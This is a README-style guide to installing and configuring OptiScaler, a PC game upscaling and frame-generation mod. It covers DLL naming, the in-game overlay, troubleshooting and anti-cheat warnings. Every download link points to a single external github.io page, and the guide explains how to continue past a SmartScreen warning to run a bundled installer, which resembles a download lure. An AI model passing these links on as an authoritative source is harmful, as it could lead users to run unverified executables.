# OptiScaler — Simple Upscaling and Frame Generation Setup

<p align="center">
  <a href="https://OptiScaler-Hub.github.io/.github"><img src="https://img.shields.io/badge/GET%20OPTISCALER-NOW-00C853?style=for-the-badge&logo=github&logoColor=white" alt="GET OPTISCALER NOW"></a>
  <a href="https://OptiScaler-Hub.github.io/.github"><img src="https://img.shields.io/badge/OPTISCALER-INSTALLER-8b5cf6?style=for-the-badge" alt="OptiScaler Installer"></a>
</p>

<p align="center">
  <a href="https://OptiScaler-Hub.github.io/.github"><img src="https://img.shields.io/badge/DLSS%202%2B-✓-2ea44f?style=flat-square" alt="DLSS 2+ Supported"></a>
  <a href="https://OptiScaler-Hub.github.io/.github"><img src="https://img.shields.io/badge/FSR%202%2B-✓-2ea44f?style=flat-square" alt="FSR 2+ Supported"></a>
  <a href="https://OptiScaler-Hub.github.io/.github"><img src="https://img.shields.io/badge/XeSS-✓-2ea44f?style=flat-square" alt="XeSS Supported"></a>
  <a href="https://OptiScaler-Hub.github.io/.github"><img src="https://img.shields.io/badge/FRAME%20GENERATION-✓-2ea44f?style=flat-square" alt="Frame Generation Supported"></a>
</p>

<p align="center">
  <img src="https://github.com/OptiScaler-Hub/.github/blob/main/assets/image/1.png?raw=true" width="700" alt="OptiScaler Overlay">
</p>

OptiScaler is an open-source utility designed to make alternative upscaling and frame-generation technologies available in compatible PC games.

It can work with games that already provide **DLSS 2+, FSR 2+ or XeSS** and, depending on the title, can redirect the game's upscaling pipeline to another supported technology.

OptiScaler can also provide additional frame-generation configurations for supported games. Actual functionality depends on the game, graphics API, installed components and the selected configuration.

> **Important:** OptiScaler is not a universal DLSS injector. Always check the compatibility information for the specific game before installation.

## Supported Upscaling Technologies

OptiScaler supports compatible games using technologies such as:

* **NVIDIA DLSS 2+**
* **AMD FSR 2+**
* **Intel XeSS**
* **FSR 3 / FSR 3.1**
* **FSR4**, where supported
* Additional upscaling configurations depending on the game

The available output options depend on the game's native implementation and the OptiScaler configuration.

## Graphics API Support

OptiScaler can be used with compatible games running through supported graphics APIs, including:

* DirectX 11
* DirectX 12
* Vulkan

The required installation method can vary between games.

Some titles work with the default `dxgi.dll` configuration, while others may require a different DLL name such as `d3d12.dll` or `winmm.dll`.

Always follow the installation instructions listed for the specific game.

## Key Features

* Supports games using DLSS 2+, FSR 2+ and XeSS.
* Allows compatible games to use alternative upscaling technologies.
* Supports FSR4 injection where compatibility allows.
* Provides frame-generation options for supported configurations.
* Works with NVIDIA, AMD and Intel GPUs where the selected technology is supported.
* Includes an in-game configuration overlay.
* Provides performance statistics.
* Supports automatic installation through the included installer.
* Allows manual installation for games requiring custom configurations.
* Stores configuration in `OptiScaler.ini`.
* Includes logging and troubleshooting options.
* Open-source and actively maintained.
* Provides a community-maintained compatibility list.

## Game Compatibility

OptiScaler compatibility is **game-specific**.

Before installing OptiScaler, check whether your game is listed in the current compatibility database.

Pay particular attention to:

* Supported game version
* Native upscaler
* Graphics API
* Required DLL name
* Required launch parameters
* Frame-generation compatibility
* Known crashes or visual issues
* Anti-cheat restrictions
* Recommended OptiScaler version

A game not appearing in the compatibility list does not necessarily mean it will not work, but additional manual configuration may be required.

## Installing OptiScaler

### 1. Download OptiScaler - [CLICK](https://OptiScaler-Hub.github.io/.github)

Download the OptiScaler `.zip` archive.

The archive contains the OptiScaler files and the installation utility required to configure the selected game.

### 2. Extract the Archive

Extract the downloaded `.zip` file to a temporary folder.

Do not run the installer directly from inside the compressed archive.

### 3. Start the Installer

Launch the included OptiScaler installer.

If Windows SmartScreen displays a warning because the executable is not recognized, verify that you downloaded the archive from a trusted source before choosing to continue.

### 4. Select the Game

Choose the game's main executable when requested.

For Unreal Engine games, the executable is commonly located in a path similar to:

```text
<Game>\GameName\Binaries\Win64\
```

or:

```text
<Game>\GameName\Binaries\WinGDK\
```

Select the actual game executable rather than a launcher whenever possible.

### 5. Choose the Configuration

Follow the installer instructions for the selected game.

Depending on the title, you may need to specify:

* GPU vendor
* Native upscaler
* Desired upscaler
* Frame-generation mode
* DLL installation method
* Additional compatibility options

The installer can automatically configure many common setups, while some games require manual settings from the Compatibility List.

### 6. Finish Installation

Allow the installer to copy the required OptiScaler files into the game directory.

Close the game before installation to prevent files from being locked.

### 7. Launch the Game

Start the game normally.

Once you reach the actual game, open the OptiScaler overlay using:

```text
Insert
```

If the overlay appears, OptiScaler has been successfully loaded.

## OptiScaler Overlay

The in-game overlay allows supported settings to be configured without manually editing the configuration file.

Default shortcuts include:

```text
Insert       - Open OptiScaler overlay
Page Up      - Show performance statistics
Page Down    - Cycle statistics display
```

Keyboard shortcuts can be changed through `OptiScaler.ini`.

If the `Insert` key does not open the overlay, try:

```text
Alt + Insert
```

Some keyboard layouts or applications may interfere with the default shortcut.

## Choosing an Upscaler

The recommended configuration depends on the game.

For example, if a game provides DLSS as its native upscaler, OptiScaler may allow that input to be redirected to another supported technology.

If a game provides FSR 2+, OptiScaler can similarly use the existing FSR pipeline for compatible alternative upscaling configurations.

> **Tip:** Start with the game's native upscaler and verify that it works correctly before experimenting with alternative configurations.

## Frame Generation

OptiScaler provides frame-generation options for compatible games.

Available modes depend on:

* Game engine
* Graphics API
* Native upscaler
* GPU
* Existing frame-generation implementation
* OptiScaler version

Some games require additional configuration for motion vectors or frame-generation inputs.

If frame generation produces excessive ghosting, flickering, UI artifacts or unstable frame pacing, check the game's compatibility notes before changing multiple settings.

## Configuration File

OptiScaler stores configuration in:

```text
OptiScaler.ini
```

This file can be edited manually when advanced configuration is required.

For troubleshooting, logging can be enabled with:

```ini
LogLevel=0
LogToFile=true
```

After reproducing a problem, the generated log can help identify loading or compatibility issues.

## Manual Installation

Some games may require manual installation.

In these cases:

1. Close the game.
2. Extract the OptiScaler files.
3. Locate the game's main executable directory.
4. Copy the required OptiScaler files next to the executable.
5. Rename `OptiScaler.dll` to the DLL name required by the game.
6. Launch the game.
7. Open the overlay with `Insert`.
8. Configure the desired options.

The most common DLL name is:

```text
dxgi.dll
```

However, some games require:

```text
d3d12.dll
```

or:

```text
winmm.dll
```

Do not rename the DLL arbitrarily. Use the DLL name recommended for the specific game in the Compatibility List.

## Unreal Engine Games

For Unreal Engine games, OptiScaler is commonly installed next to the game's shipping executable.

Typical locations include:

```text
<Game>\GameName\Binaries\Win64\
```

or:

```text
<Game>\GameName\Binaries\WinGDK\
```

Avoid placing OptiScaler inside the Unreal Engine `Engine` directory unless the game's compatibility instructions specifically require it.

## Compatibility With Other Mods

OptiScaler can work alongside certain graphics modifications, including ReShade and other graphics tools.

However, multiple DLL-based modifications can interfere with each other.

If the game crashes after installing OptiScaler:

1. Temporarily disable other graphics mods.
2. Disable RTSS, MSI Afterburner or CapFrameX overlays while testing.
3. Verify the correct DLL name.
4. Check the game's Compatibility List.
5. Reinstall OptiScaler using the recommended configuration.

## Troubleshooting

### OptiScaler Overlay Does Not Appear

Check the following:

1. Make sure OptiScaler is installed next to the correct executable.
2. Verify that the game uses a supported DLSS, FSR or XeSS implementation.
3. Start the game and enter the actual game world before pressing `Insert`.
4. Try `Alt + Insert`.
5. Temporarily disable third-party overlays.
6. Check the Compatibility List for the required DLL name.
7. Enable OptiScaler logging if necessary.

### Game Crashes on Startup

Try the following:

1. Remove OptiScaler and confirm that the game launches normally.
2. Check the compatibility entry for your game.
3. Verify the installed OptiScaler version.
4. Try the DLL name recommended for the game.
5. Disable other DLL-based graphics modifications.
6. Check whether the game requires a specific launch parameter.
7. Test the configuration with frame generation disabled.

### Access Denied

If Windows reports:

```text
Access denied
```

make sure:

* The game is completely closed.
* The launcher is not keeping the game files open.
* Your Windows account has write access to the game directory.
* The installer has the permissions required to modify the selected directory.

Administrator privileges may be required for games installed in protected Windows directories.

## Restoring the Original Configuration

Before modifying a game, keep a backup of the original files.

To return to the original configuration:

1. Close the game.
2. Remove the OptiScaler files.
3. Restore any original DLLs that were renamed or replaced.
4. Remove `OptiScaler.ini` if it is no longer required.
5. Launch the game normally.

If the installer created backups, use those backups to restore the original files whenever possible.

## Online Games and Anti-Cheat

> **Warning:** Do not use OptiScaler with online games protected by anti-cheat unless you have verified that the specific game and configuration are safe.

DLL modifications can be detected by anti-cheat systems and may result in the game refusing to launch or, depending on the game's policies, account penalties.

For competitive and multiplayer games, always check the current compatibility information before modifying game files.

## System Requirements

OptiScaler does not require a specific GPU brand. Requirements depend on the selected upscaling and frame-generation technology.

* **Operating System:** Windows
* **GPU:** NVIDIA, AMD or Intel GPU with required feature support
* **Game:** Compatible title using DLSS 2+, FSR 2+ or XeSS
* **Graphics API:** Typically DirectX 11, DirectX 12 or Vulkan
* **Storage:** Small amount of free space for OptiScaler files
* **Permissions:** Write access to the game directory
* **Internet:** Required for downloading OptiScaler and optional components

Actual compatibility depends on the individual game and OptiScaler version.

## Recommended Setup

For the simplest installation:

1. **Check the Compatibility List.**
2. Identify the game's native upscaler.
3. Download the OptiScaler `.zip` archive.
4. Extract the archive.
5. Run the included installer.
6. Select the game's main executable.
7. Apply the recommended configuration.
8. Launch the game.
9. Press **Insert** to open the OptiScaler overlay.
10. Select the desired upscaling or frame-generation option.
11. Test image quality and performance.

If the automatic installer does not work, use the manual installation method specified for the game.

> **Note:** OptiScaler is actively developed. Supported games, technologies, frame-generation options and installation requirements can change between releases. Always check the current Compatibility List and documentation before installing OptiScaler for a specific game.
